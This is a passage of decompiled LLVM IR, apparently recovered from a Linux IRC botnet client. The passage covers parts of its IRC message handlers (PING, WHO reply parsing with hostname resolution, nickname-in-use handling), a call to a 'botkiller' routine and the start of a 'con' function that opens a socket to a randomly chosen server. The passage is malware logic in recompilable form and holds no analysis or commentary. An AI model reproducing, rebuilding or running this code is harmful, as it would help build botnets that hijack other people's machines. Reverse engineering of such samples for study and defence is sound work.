  %v22_8048ef6 = inttoptr i32 %v5_8048ef6 to i8*
  %v5_8048eff = icmp slt i32 %stack_var_-16.0104, %.v4_8048ec5
  br i1 %v5_8048eff, label %dec_label_pc_8048f11.preheader, label %dec_label_pc_8048f99

dec_label_pc_8048f11.preheader:                   ; preds = %dec_label_pc_8048ef6
  br label %dec_label_pc_8048f11

dec_label_pc_8048f0e:                             ; preds = %dec_label_pc_8048f36
  %v4_8048f0e = add i32 %storemerge7, 1
  br label %dec_label_pc_8048f11

dec_label_pc_8048f11:                             ; preds = %dec_label_pc_8048f11.preheader, %dec_label_pc_8048f0e
  %storemerge7 = phi i32 [ %v4_8048f0e, %dec_label_pc_8048f0e ], [ 0, %dec_label_pc_8048f11.preheader ]
  store i1 false, i1* @df, align 1
  store i32 %v5_8048ef6, i32* @edi, align 4
  %v3_8048f2b = call i32 @_strlen(i8* %v22_8048ef6)
  %v7_8048f32 = icmp ult i32 %storemerge7, %v3_8048f2b
  %v1_8048f34 = icmp eq i1 %v7_8048f32, false
  %.pre40 = add i32 %storemerge7, %v5_8048ef6
  br i1 %v1_8048f34, label %dec_label_pc_8048f11.dec_label_pc_8048f42_crit_edge, label %dec_label_pc_8048f36

dec_label_pc_8048f11.dec_label_pc_8048f42_crit_edge: ; preds = %dec_label_pc_8048f11
  %.pre47 = inttoptr i32 %.pre40 to i8*
  br label %dec_label_pc_8048f42

dec_label_pc_8048f36:                             ; preds = %dec_label_pc_8048f11
  %v1_8048f3c = inttoptr i32 %.pre40 to i8*
  %v2_8048f3c = load i8, i8* %v1_8048f3c, align 1
  %v7_8048f3e = icmp eq i8 %v2_8048f3c, 32
  %v1_8048f40 = icmp eq i1 %v7_8048f3e, false
  br i1 %v1_8048f40, label %dec_label_pc_8048f0e, label %dec_label_pc_8048f42

dec_label_pc_8048f42:                             ; preds = %dec_label_pc_8048f36, %dec_label_pc_8048f11.dec_label_pc_8048f42_crit_edge
  %v26_8048f89.pre-phi = phi i8* [ %.pre47, %dec_label_pc_8048f11.dec_label_pc_8048f42_crit_edge ], [ %v1_8048f3c, %dec_label_pc_8048f36 ]
  store i32 %stack_var_-16.0104, i32* @ebx, align 4
  %v1_8048f48 = add i32 %storemerge7, 1
  %v1_8048f4d = call i32 @malloc(i32 %v1_8048f48)
  %v1_8048f55 = load i32, i32* @ebp, align 4
  %v2_8048f55 = load i32, i32* @ebx, align 4
  %v3_8048f55 = mul i32 %v2_8048f55, 4
  %v4_8048f55 = add i32 %v1_8048f55, -76
  %v5_8048f55 = add i32 %v4_8048f55, %v3_8048f55
  %v6_8048f55 = inttoptr i32 %v5_8048f55 to i32*
  store i32 %v1_8048f4d, i32* %v6_8048f55, align 4
  %v0_8048f5f = load i32, i32* @ebp, align 4
  %v2_8048f5f = mul nuw nsw i32 %stack_var_-16.0104, 4
  %v3_8048f5f = add nuw nsw i32 %v2_8048f5f, -76
  %v4_8048f5f = add i32 %v0_8048f5f, %v3_8048f5f
  %v5_8048f5f = inttoptr i32 %v4_8048f5f to i32*
  %v6_8048f5f = load i32, i32* %v5_8048f5f, align 4
  %v3_8048f6b = inttoptr i32 %v6_8048f5f to i8*
  %v4_8048f6b = call i32 @strncpy(i8* %v3_8048f6b, i32 %v5_8048ef6, i32 %storemerge7)
  %v0_8048f76 = load i32, i32* @ebp, align 4
  %v4_8048f76 = add i32 %v0_8048f76, %v3_8048f5f
  %v5_8048f76 = inttoptr i32 %v4_8048f76 to i32*
  %v6_8048f76 = load i32, i32* %v5_8048f76, align 4
  %v2_8048f7d = add i32 %v6_8048f76, %storemerge7
  %v1_8048f80 = inttoptr i32 %v2_8048f7d to i8*
  store i8 0, i8* %v1_8048f80, align 1
  %v4_8048f83 = add nuw nsw i32 %stack_var_-16.0104, 1
  %v2_8048f8f = load i8, i8* %v26_8048f89.pre-phi, align 1
  %v4_8048f91 = icmp eq i8 %v2_8048f8f, 0
  %v1_8048f93 = icmp eq i1 %v4_8048f91, false
  br i1 %v1_8048f93, label %dec_label_pc_8048ef6, label %dec_label_pc_8048f99

dec_label_pc_8048f99:                             ; preds = %dec_label_pc_8048f42, %dec_label_pc_8048ef6, %dec_label_pc_8048ec5
  %v4_8049010 = load i32, i32* bitcast ([4 x i8]** @global_var_8054040.271 to i32*), align 8
  %v1_8049017 = icmp eq i32 %v4_8049010, 0
  %v1_8049019 = icmp eq i1 %v1_8049017, false
  br i1 %v1_8049019, label %dec_label_pc_8048fa2, label %dec_label_pc_804901b

dec_label_pc_8048fa2:                             ; preds = %dec_label_pc_8048f99
  %v2_8048fb7 = inttoptr i32 %v4_8049010 to i8*
  %v3_8048fb7 = call i32 @__GI_strcasecmp(i8* %v2_8048fb7, i32 %v2_8048d9b)
  %v4_8048fc6 = load i32, i32* @global_var_8054044.272, align 4
  call void @__pseudo_call(i32 %v4_8048fc6)
  %v5_804900695 = icmp sgt i32 %.v4_8048ec5, 1
  br i1 %v5_804900695, label %dec_label_pc_8048fea.lr.ph, label %dec_label_pc_804901b

dec_label_pc_8048fea.lr.ph:                       ; preds = %dec_label_pc_8048fa2
  br label %dec_label_pc_8048fea

dec_label_pc_8048fea:                             ; preds = %dec_label_pc_8048fea.lr.ph, %dec_label_pc_8048fea
  %storemerge96 = phi i32 [ 1, %dec_label_pc_8048fea.lr.ph ], [ %v4_8048ffd, %dec_label_pc_8048fea ]
  %v0_8048fed = load i32, i32* @ebp, align 4
  %v2_8048fed = mul nuw nsw i32 %storemerge96, 4
  %v3_8048fed = add nuw nsw i32 %v2_8048fed, -76
  %v4_8048fed = add i32 %v3_8048fed, %v0_8048fed
  %v5_8048fed = inttoptr i32 %v4_8048fed to i32*
  %v6_8048fed = load i32, i32* %v5_8048fed, align 4
  %v1_8048ff5 = call i32 @free(i32 %v6_8048fed)
  %v4_8048ffd = add nuw nsw i32 %storemerge96, 1
  %v5_8049006 = icmp slt i32 %v4_8048ffd, %.v4_8048ec5
  br i1 %v5_8049006, label %dec_label_pc_8048fea, label %dec_label_pc_804901b

dec_label_pc_804901b:                             ; preds = %dec_label_pc_8048fa2, %dec_label_pc_8048fea, %dec_label_pc_8048f99, %dec_label_pc_8048dfc, %dec_label_pc_8048d7f, %dec_label_pc_8048d69
  %v0_8049021 = phi i32 [ %v4_8049010, %dec_label_pc_8048f99 ], [ %v3_8048e12, %dec_label_pc_8048dfc ], [ %v3_8048d8b, %dec_label_pc_8048d7f ], [ %v6_8048d75, %dec_label_pc_8048d69 ], [ 1, %dec_label_pc_8048fa2 ], [ %.v4_8048ec5, %dec_label_pc_8048fea ]
  ret i32 %v0_8049021

; uselistorder directives
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i8* %v26_8048f89.pre-phi, { 1, 0 }
  uselistorder i32 %.pre40, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v5_8048ef6, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-16.0104, { 3, 2, 1, 0 }
  uselistorder i32 %.v4_8048ec5, { 1, 4, 2, 3, 0 }
  uselistorder i32 %v4_8048e7a, { 1, 0 }
  uselistorder i32 %v5_8048e77, { 0, 2, 1 }
  uselistorder i8* %stack_var_-24.0110, { 0, 1, 4, 3, 2 }
  uselistorder i32 %.pre30, { 0, 2, 1 }
  uselistorder i32 %storemerge10, { 1, 0, 2 }
  uselistorder i32 %.pre22, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 0, 2 }
  uselistorder i32 %.pre, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge12, { 1, 0, 2 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804901b, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8048fea, { 1, 0 }
  uselistorder label %dec_label_pc_8048f11, { 1, 0 }
  uselistorder label %dec_label_pc_8048ef6, { 1, 0 }
  uselistorder label %dec_label_pc_8048ea0, { 1, 0 }
  uselistorder label %dec_label_pc_8048ea0.preheader, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048e56, { 1, 0 }
  uselistorder label %dec_label_pc_8048dcb, { 1, 0 }
  uselistorder label %dec_label_pc_8048d38, { 1, 0 }
  uselistorder label %dec_label_pc_8048ce0, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049028 = load i32, i32* @global_var_8056a10.268, align 16
  %v4_8049039 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_80511c0.273 to i32), i32 %v0_8049028)
  %v0_8049046 = load i32, i32* @global_var_8056a28.263, align 8
  %v4_8049056 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_80511cf.275 to i32), i32 %v0_8049046)
  %v0_804905e = load i32, i32* @global_var_8056a10.268, align 16
  %v4_804906f = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_80511dc.276 to i32), i32 %v0_804905e)
  ret i32 %v4_804906f

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804908d = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_80511e4.277 to i32), i32 %arg2)
  ret i32 %v4_804908d
}

define i32 @_352(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-32 = alloca i8, align 1
  store i8* %arg1, i8** %stack_var_-20, align 4
  br label %dec_label_pc_80490bb.preheader

dec_label_pc_80490b5:                             ; preds = %dec_label_pc_80490da
  %v5_80490b5 = add i32 %.pre41, 1
  %v22_80490b5 = inttoptr i32 %v5_80490b5 to i8*
  store i8* %v22_80490b5, i8** %stack_var_-20, align 4
  %v4_80490b8 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80490bb

dec_label_pc_80490bb:                             ; preds = %dec_label_pc_80490bb.preheader, %dec_label_pc_80490b5
  %v3_80490e3 = phi i8* [ %v22_80490b5, %dec_label_pc_80490b5 ], [ %v4_804914c74, %dec_label_pc_80490bb.preheader ]
  %stack_var_-28.0 = phi i32 [ %v4_80490b8, %dec_label_pc_80490b5 ], [ %stack_var_-28.175, %dec_label_pc_80490bb.preheader ]
  %v3_80490cf = call i32 @_strlen(i8* %arg1)
  %v7_80490d6 = icmp ult i32 %stack_var_-28.0, %v3_80490cf
  %v1_80490d8 = icmp eq i1 %v7_80490d6, false
  %.pre41 = ptrtoint i8* %v3_80490e3 to i32
  br i1 %v1_80490d8, label %dec_label_pc_80490e3, label %dec_label_pc_80490da

dec_label_pc_80490da:                             ; preds = %dec_label_pc_80490bb
  %v2_80490dd = load i8, i8* %v3_80490e3, align 1
  %v7_80490df = icmp eq i8 %v2_80490dd, 32
  %v1_80490e1 = icmp eq i1 %v7_80490df, false
  br i1 %v1_80490e1, label %dec_label_pc_80490b5, label %dec_label_pc_80490e3

dec_label_pc_80490e3:                             ; preds = %dec_label_pc_80490bb, %dec_label_pc_80490da
  %v5_80490e3 = add i32 %.pre41, 1
  %v22_80490e3 = inttoptr i32 %v5_80490e3 to i8*
  store i8* %v22_80490e3, i8** %stack_var_-20, align 4
  %v3_80490fa = call i32 @_strlen(i8* %arg1)
  %v12_8049101 = icmp eq i32 %stack_var_-28.0, %v3_80490fa
  br i1 %v12_8049101, label %dec_label_pc_80492bb, label %dec_label_pc_8049109

dec_label_pc_8049109:                             ; preds = %dec_label_pc_80490e3
  %v4_8049109 = add nuw nsw i32 %storemerge1476, 1
  %v7_8049110 = icmp sgt i32 %storemerge1476, 3
  br i1 %v7_8049110, label %dec_label_pc_804911e.preheader, label %dec_label_pc_80490bb.preheader

dec_label_pc_80490bb.preheader:                   ; preds = %entry, %dec_label_pc_8049109
  %storemerge1476 = phi i32 [ 0, %entry ], [ %v4_8049109, %dec_label_pc_8049109 ]
  %stack_var_-28.175 = phi i32 [ 0, %entry ], [ %stack_var_-28.0, %dec_label_pc_8049109 ]
  %v4_804914c74 = phi i8* [ %arg1, %entry ], [ %v22_80490e3, %dec_label_pc_8049109 ]
  br label %dec_label_pc_80490bb

dec_label_pc_804911e.preheader:                   ; preds = %dec_label_pc_8049109
  br label %dec_label_pc_804911e

dec_label_pc_804911b:                             ; preds = %dec_label_pc_804913d
  %v4_804911b = add i32 %storemerge13, 1
  br label %dec_label_pc_804911e

dec_label_pc_804911e:                             ; preds = %dec_label_pc_804911e.preheader, %dec_label_pc_804911b
  %storemerge13 = phi i32 [ %v4_804911b, %dec_label_pc_804911b ], [ 0, %dec_label_pc_804911e.preheader ]
  %v3_8049132 = call i32 @_strlen(i8* %v22_80490e3)
  %v7_8049139 = icmp ult i32 %storemerge13, %v3_8049132
  %v1_804913b = icmp eq i1 %v7_8049139, false
  %.pre = add i32 %storemerge13, %v5_80490e3
  br i1 %v1_804913b, label %dec_label_pc_804911e.dec_label_pc_8049149_crit_edge, label %dec_label_pc_804913d

dec_label_pc_804911e.dec_label_pc_8049149_crit_edge: ; preds = %dec_label_pc_804911e
  %.pre30 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049149

dec_label_pc_804913d:                             ; preds = %dec_label_pc_804911e
  %v1_8049143 = inttoptr i32 %.pre to i8*
  %v2_8049143 = load i8, i8* %v1_8049143, align 1
  %v7_8049145 = icmp eq i8 %v2_8049143, 32
  %v1_8049147 = icmp eq i1 %v7_8049145, false
  br i1 %v1_8049147, label %dec_label_pc_804911b, label %dec_label_pc_8049149

dec_label_pc_8049149:                             ; preds = %dec_label_pc_804913d, %dec_label_pc_804911e.dec_label_pc_8049149_crit_edge
  %v1_804914f.pre-phi = phi i8* [ %.pre30, %dec_label_pc_804911e.dec_label_pc_8049149_crit_edge ], [ %v1_8049143, %dec_label_pc_804913d ]
  store i8 0, i8* %v1_804914f.pre-phi, align 1
  %v0_8049152 = load i32, i32* @global_var_8056a10.268, align 16
  %tmp63 = bitcast i8** %stack_var_-20 to i32*
  %v3_804915b9 = load i32, i32* %tmp63, align 4
  %v0_804915e.cast = inttoptr i32 %v3_804915b9 to i8*
  %v4_804915e = call i32 @__GI_strcasecmp(i8* %v0_804915e.cast, i32 %v0_8049152)
  %v1_8049166 = icmp eq i32 %v4_804915e, 0
  %v1_8049168 = icmp eq i1 %v1_8049166, false
  br i1 %v1_8049168, label %dec_label_pc_80492bb, label %dec_label_pc_804916e

dec_label_pc_804916e:                             ; preds = %dec_label_pc_8049149
  %v0_804916e = load i32, i32* @global_var_805438c.278, align 4
  %v1_8049173 = icmp eq i32 %v0_804916e, 0
  %v1_8049175 = icmp eq i1 %v1_8049173, false
  br i1 %v1_8049175, label %dec_label_pc_80492bb, label %dec_label_pc_804917b

dec_label_pc_804917b:                             ; preds = %dec_label_pc_804916e
  store i8* %arg1, i8** %stack_var_-20, align 4
  br label %dec_label_pc_8049197.preheader

dec_label_pc_8049191:                             ; preds = %dec_label_pc_80491b6
  %v5_8049191 = add i32 %.pre40, 1
  %v22_8049191 = inttoptr i32 %v5_8049191 to i8*
  store i8* %v22_8049191, i8** %stack_var_-20, align 4
  %v4_8049194 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_8049197

dec_label_pc_8049197:                             ; preds = %dec_label_pc_8049197.preheader, %dec_label_pc_8049191
  %v3_80491bf = phi i8* [ %v22_8049191, %dec_label_pc_8049191 ], [ %v4_804922871, %dec_label_pc_8049197.preheader ]
  %stack_var_-28.2 = phi i32 [ %v4_8049194, %dec_label_pc_8049191 ], [ %stack_var_-28.372, %dec_label_pc_8049197.preheader ]
  %v3_80491ab = call i32 @_strlen(i8* %arg1)
  %v7_80491b2 = icmp ult i32 %stack_var_-28.2, %v3_80491ab
  %v1_80491b4 = icmp eq i1 %v7_80491b2, false
  %.pre40 = ptrtoint i8* %v3_80491bf to i32
  br i1 %v1_80491b4, label %dec_label_pc_80491bf, label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_8049197
  %v2_80491b9 = load i8, i8* %v3_80491bf, align 1
  %v7_80491bb = icmp eq i8 %v2_80491b9, 32
  %v1_80491bd = icmp eq i1 %v7_80491bb, false
  br i1 %v1_80491bd, label %dec_label_pc_8049191, label %dec_label_pc_80491bf

dec_label_pc_80491bf:                             ; preds = %dec_label_pc_8049197, %dec_label_pc_80491b6
  %v5_80491bf = add i32 %.pre40, 1
  %v22_80491bf = inttoptr i32 %v5_80491bf to i8*
  store i8* %v22_80491bf, i8** %stack_var_-20, align 4
  %v3_80491d6 = call i32 @_strlen(i8* %arg1)
  %v12_80491dd = icmp eq i32 %stack_var_-28.2, %v3_80491d6
  br i1 %v12_80491dd, label %dec_label_pc_80492bb, label %dec_label_pc_80491e5

dec_label_pc_80491e5:                             ; preds = %dec_label_pc_80491bf
  %v4_80491e5 = add nuw nsw i32 %storemerge1273, 1
  %v7_80491ec = icmp sgt i32 %storemerge1273, 1
  br i1 %v7_80491ec, label %dec_label_pc_80491fa.preheader, label %dec_label_pc_8049197.preheader

dec_label_pc_8049197.preheader:                   ; preds = %dec_label_pc_804917b, %dec_label_pc_80491e5
  %storemerge1273 = phi i32 [ 0, %dec_label_pc_804917b ], [ %v4_80491e5, %dec_label_pc_80491e5 ]
  %stack_var_-28.372 = phi i32 [ 0, %dec_label_pc_804917b ], [ %stack_var_-28.2, %dec_label_pc_80491e5 ]
  %v4_804922871 = phi i8* [ %arg1, %dec_label_pc_804917b ], [ %v22_80491bf, %dec_label_pc_80491e5 ]
  br label %dec_label_pc_8049197

dec_label_pc_80491fa.preheader:                   ; preds = %dec_label_pc_80491e5
  br label %dec_label_pc_80491fa

dec_label_pc_80491f7:                             ; preds = %dec_label_pc_8049219
  %v4_80491f7 = add i32 %storemerge, 1
  br label %dec_label_pc_80491fa

dec_label_pc_80491fa:                             ; preds = %dec_label_pc_80491fa.preheader, %dec_label_pc_80491f7
  %storemerge = phi i32 [ %v4_80491f7, %dec_label_pc_80491f7 ], [ 0, %dec_label_pc_80491fa.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_80491bf, i32* @edi, align 4
  %v3_804920e = call i32 @_strlen(i8* %v22_80491bf)
  %v0_8049215 = load i32, i32* @edx, align 4
  %v7_8049215 = icmp ult i32 %v0_8049215, %v3_804920e
  %v1_8049217 = icmp eq i1 %v7_8049215, false
  %.pre31 = add i32 %storemerge, %v5_80491bf
  br i1 %v1_8049217, label %dec_label_pc_80491fa.dec_label_pc_8049225_crit_edge, label %dec_label_pc_8049219

dec_label_pc_80491fa.dec_label_pc_8049225_crit_edge: ; preds = %dec_label_pc_80491fa
  %.pre38 = inttoptr i32 %.pre31 to i8*
  br label %dec_label_pc_8049225

dec_label_pc_8049219:                             ; preds = %dec_label_pc_80491fa
  %v1_804921f = inttoptr i32 %.pre31 to i8*
  %v2_804921f = load i8, i8* %v1_804921f, align 1
  %v7_8049221 = icmp eq i8 %v2_804921f, 32
  %v1_8049223 = icmp eq i1 %v7_8049221, false
  br i1 %v1_8049223, label %dec_label_pc_80491f7, label %dec_label_pc_8049225

dec_label_pc_8049225:                             ; preds = %dec_label_pc_8049219, %dec_label_pc_80491fa.dec_label_pc_8049225_crit_edge
  %v1_804922b.pre-phi = phi i8* [ %.pre38, %dec_label_pc_80491fa.dec_label_pc_8049225_crit_edge ], [ %v1_804921f, %dec_label_pc_8049219 ]
  store i8 0, i8* %v1_804922b.pre-phi, align 1
  %v3_804923110 = load i32, i32* %tmp63, align 4
  %v2_8049234 = call i32 @inet_addr(i32 %v3_804923110)
  %v3_8049234 = trunc i32 %v2_8049234 to i8
  store i8 %v3_8049234, i8* %stack_var_-32, align 1
  %sext = mul i32 %v2_8049234, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8049245 = icmp eq i1 %tmp, false
  br i1 %v1_8049245, label %dec_label_pc_8049225._crit_edge, label %dec_label_pc_8049247

dec_label_pc_8049225._crit_edge:                  ; preds = %dec_label_pc_8049225
  br label %bb

dec_label_pc_8049247:                             ; preds = %dec_label_pc_8049225
  %v2_804924d = call i32 @__GI_gethostbyname(i32 %v3_804923110)
  %v4_8049258 = icmp eq i32 %v2_804924d, 0
  br i1 %v4_8049258, label %dec_label_pc_80492bb, label %dec_label_pc_804925e

dec_label_pc_804925e:                             ; preds = %dec_label_pc_8049247
  %v1_8049261 = add i32 %v2_804924d, 12
  %v2_8049261 = inttoptr i32 %v1_8049261 to i32*
  %v3_8049261 = load i32, i32* %v2_8049261, align 4
  %v1_8049269 = add i32 %v2_804924d, 16
  %v2_8049269 = inttoptr i32 %v1_8049269 to i32*
  %v3_8049269 = load i32, i32* %v2_8049269, align 4
  %v1_804926c = inttoptr i32 %v3_8049269 to i32*
  %v2_804926c = load i32, i32* %v1_804926c, align 4
  %v1_8049273 = inttoptr i32 %v2_804926c to i8*
  %v7_8049276 = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_8049273, i32 %v3_8049261)
  %v2_8049283.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_8049225._crit_edge, %dec_label_pc_804925e
  %v2_8049283 = phi i8 [ %v3_8049234, %dec_label_pc_8049225._crit_edge ], [ %v2_8049283.pre, %dec_label_pc_804925e ]
  store i8 %v2_8049283, i8* bitcast (i8** @global_var_805438b.280 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8054388.279 to i8*), align 4
  store i32 256, i32* @global_var_805438c.278, align 4
  br label %dec_label_pc_80492bb

dec_label_pc_80492bb:                             ; preds = %dec_label_pc_80490e3, %dec_label_pc_80491bf, %dec_label_pc_8049247, %dec_label_pc_804916e, %dec_label_pc_8049149, %bb
  %v0_80492c1 = phi i32 [ 0, %dec_label_pc_8049247 ], [ %v0_804916e, %dec_label_pc_804916e ], [ %v4_804915e, %dec_label_pc_8049149 ], [ ptrtoint (i8** @global_var_8054388.279 to i32), %bb ], [ %v3_80491d6, %dec_label_pc_80491bf ], [ %v3_80490fa, %dec_label_pc_80490e3 ]
  ret i32 %v0_80492c1

; uselistorder directives
  uselistorder i32 %v2_804924d, { 2, 1, 0 }
  uselistorder i32 %.pre31, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge1273, { 1, 0 }
  uselistorder i32 %v3_80491d6, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i8* %v3_80491bf, { 1, 0 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0, 2 }
  uselistorder i32 %storemerge1476, { 1, 0 }
  uselistorder i32 %v3_80490fa, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8* %v3_80490e3, { 1, 0 }
  uselistorder i8** %stack_var_-20, { 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i8** @global_var_8054388.279, { 1, 0 }
  uselistorder i8* %arg1, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_80492bb, { 5, 2, 1, 3, 4, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_80491fa, { 1, 0 }
  uselistorder label %dec_label_pc_8049197.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80491bf, { 1, 0 }
  uselistorder label %dec_label_pc_804911e, { 1, 0 }
  uselistorder label %dec_label_pc_80490bb.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80490e3, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %stack_var_-62 = alloca i32, align 4
  %v0_80492c8 = load i32, i32* @global_var_8056a10.268, align 16
  %v1_80492d1 = call i32 @free(i32 %v0_80492c8)
  store i32 %v1_80492d1, i32* @eax, align 4
  %v2_80492e0 = call i32 @makestring(i32 ptrtoint ([14 x i8]* @global_var_80511ed.283 to i32))
  %v2_80492ee = ptrtoint i32* %stack_var_-62 to i32
  store i32 %v2_80492ee, i32* @eax, align 4
  %v3_80492f2 = bitcast i32* %stack_var_-62 to i8*
  %v4_80492f2 = call i32 @strcpy(i8* %v3_80492f2, i32 ptrtoint ([14 x i8]* @global_var_80511ed.283 to i32))
  %v4_8049304 = call i32 @strcat(i8* %v3_80492f2, i32 %v2_80492e0)
  store i32 %v2_80492ee, i32* @global_var_8056a10.268, align 16
  %v0_8049314 = call i32 @botkiller()
  ret i32 %v0_8049314
}

define i32 @con() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804931b = load i32, i32* @ebp, align 4
  store i32 %v0_804931b, i32* %stack_var_-4, align 4
  %v4_804931b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804931b, i32* @ebp, align 4
  %v15_804931e = ptrtoint i32* %stack_var_-44 to i32
  %v2_80493f6 = ptrtoint i32* %stack_var_-32 to i32
  %v2_80493f9 = ptrtoint i32* %stack_var_-28 to i32
  %v2_804944b = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_8049323

dec_label_pc_8049323:                             ; preds = %dec_label_pc_8049323.backedge, %entry
  %v0_804936a.pre14 = phi i32 [ %v15_804931e, %entry ], [ %storemerge16.in, %dec_label_pc_8049323.backedge ]
  %stack_var_-8.0 = phi i32 [ %tmp20, %entry ], [ %stack_var_-8.0.be, %dec_label_pc_8049323.backedge ]
  store i32 -1, i32* @global_var_8056a14.284, align 4
  store i32 1, i32* %stack_var_-36, align 4
  %v0_8049334 = load i32, i32* @global_var_8054380.285, align 128
  store i32 %v0_8049334, i32* @eax, align 4
  %v1_8049339 = icmp eq i32 %v0_8049334, 0
  %v1_804933b = icmp eq i1 %v1_8049339, false
  br i1 %v1_804933b, label %dec_label_pc_8049360, label %dec_label_pc_804933d

dec_label_pc_804933d:                             ; preds = %dec_label_pc_8049323
  %v1_804933d = call i32 @random()
  %v0_8049344 = load i64, i64* @global_var_8054018.286, align 8
  %v2_804934d = ashr i32 %v1_804933d, 31
  %v2_8049350 = zext i32 %v1_804933d to i64
  %v4_8049350 = zext i32 %v2_804934d to i64
  %v5_8049350 = mul nuw i64 %v4_8049350, 4294967296
  %v6_8049350 = or i64 %v5_8049350, %v2_8049350
  %v7_8049350 = and i64 %v0_8049344, 4294967295
  %v10_8049350 = srem i64 %v6_8049350, %v7_8049350
  %v11_8049350 = trunc i64 %v10_8049350 to i32
  store i32 %v11_8049350, i32* %edx.global-to-local, align 4
  store i32 %v11_8049350, i32* %eax.global-to-local, align 4
  %v1_8049354 = mul i32 %v11_8049350, 4
  %v2_8049354 = add i32 %v1_8049354, ptrtoint ([22 x i8]** @global_var_805401c.288 to i32)
  %v3_8049354 = inttoptr i32 %v2_8049354 to i32*
  %v4_8049354 = load i32, i32* %v3_8049354, align 4
  store i32 %v4_8049354, i32* %eax.global-to-local, align 4
  store i32 %v4_8049354, i32* @global_var_8056a1c.289, align 4
  %v0_804936a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049360

dec_label_pc_8049360:                             ; preds = %dec_label_pc_8049323, %dec_label_pc_804933d
  %v0_804936a.pre = phi i32 [ %v0_804936a.pre14, %dec_label_pc_8049323 ], [ %v0_804936a.pre.pre, %dec_label_pc_804933d ]
  store i32 0, i32* @global_var_8054380.285, align 128
  br label %dec_label_pc_804936a

dec_label_pc_804936a:                             ; preds = %dec_label_pc_804936a, %dec_label_pc_8049360
  %v0_804936a = phi i32 [ %v1_8049378, %dec_label_pc_804936a ], [ %v0_804936a.pre, %dec_label_pc_8049360 ]
  %v1_804936d = add i32 %v0_804936a, -8
  %v2_804936d = inttoptr i32 %v1_804936d to i32*
  store i32 6, i32* %v2_804936d, align 4
  %v1_804936f = add i32 %v0_804936a, -12
  %v2_804936f = inttoptr i32 %v1_804936f to i32*
  store i32 1, i32* %v2_804936f, align 4
  %v1_8049371 = add i32 %v0_804936a, -16
  %v2_8049371 = inttoptr i32 %v1_8049371 to i32*
  store i32 2, i32* %v2_8049371, align 4
  %v0_8049373 = load i32, i32* %stack_var_-36, align 4
  %v1_8049373 = load i32, i32* %stack_var_-32, align 4
  %v2_8049373 = load i32, i32* %stack_var_-28, align 4
  %v3_8049373 = call i32 @socket(i32 %v0_8049373, i32 %v1_8049373, i32 %v2_8049373)
  %v0_8049378 = load i32, i32* @esp, align 4
  %v1_8049378 = add i32 %v0_8049378, 16
  store i32 %v3_8049373, i32* @global_var_8056a14.284, align 4
  store i32 %v3_8049373, i32* %eax.global-to-local, align 4
  %v2_8049385 = icmp slt i32 %v3_8049373, 0
  br i1 %v2_8049385, label %dec_label_pc_804936a, label %dec_label_pc_8049389

dec_label_pc_8049389:                             ; preds = %dec_label_pc_804936a
  %v0_8049389 = load i32, i32* @global_var_8056a1c.289, align 4
  store i32 %v0_8049389, i32* %eax.global-to-local, align 4
  %v3_8049391 = inttoptr i32 %v0_8049378 to i32*
  store i32 %v0_8049389, i32* %v3_8049391, align 4
  %v0_8049392 = load i32, i32* %stack_var_-36, align 4
  %v1_8049392 = call i32 @inet_addr(i32 %v0_8049392)
  store i32 %v1_8049392, i32* %eax.global-to-local, align 4
  %v0_8049397 = load i32, i32* @esp, align 4
  %v1_804939a = icmp eq i32 %v1_8049392, 0
  br i1 %v1_804939a, label %dec_label_pc_80493b4, label %dec_label_pc_804939e

dec_label_pc_804939e:                             ; preds = %dec_label_pc_8049389
